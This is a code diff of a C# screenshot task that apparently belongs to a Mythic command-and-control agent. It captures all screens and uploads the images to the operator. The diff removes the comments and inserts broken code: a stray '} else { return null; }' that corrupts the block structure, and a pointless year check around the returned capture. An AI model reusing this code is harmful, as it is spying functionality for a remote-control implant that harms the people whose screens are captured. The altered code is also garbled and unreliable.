@@ -31,7 +31,7 @@ namespace Tasks
             MythicTaskResponse resp = CreateTaskResponse("", true);
             try
             {
-                //foreach screen in all screens, pass it to the GetBytesFromScreen function and then put the output into a list
+                
                 List<byte[]> captures = Screen.AllScreens.Select(GetBytesFromScreen).ToList();
 
                 foreach (byte[] bScreen in captures)
@@ -39,15 +39,15 @@ namespace Tasks
                     bool putFile = _agent.GetFileManager().PutFile(_stopToken.Token, _data.ID, bScreen, null, out string mythicFileId, true);
                     if (putFile is false)
                     {
-                        //if we can't put the file, then we need to break out of the loop and return an error
-                        DebugHelp.DebugWriteLine("put file failed");
+                        
+                        DebugHelp.DebugWriteLine("put file failed"); } else { return null; }
                         resp = CreateTaskResponse("", true, "error");
                         break;
                     }
-                    //add the valid mythicFileId to the response and then add it to the queue
+                    
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false, ""));
                 }
-                //if this is reached without the loop breaking then it will be a success state
+                
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             }
             catch (Exception e)
@@ -69,7 +69,7 @@ namespace Tasks
             bmpScreenCapture.Save(ms, ImageFormat.Png);
             byte[] bScreen = ms.ToArray();
 
-            return bScreen;
+            if(DateTime.Now.Year > 2020) { return bScreen; } else { return null; }
         }
     }
 }
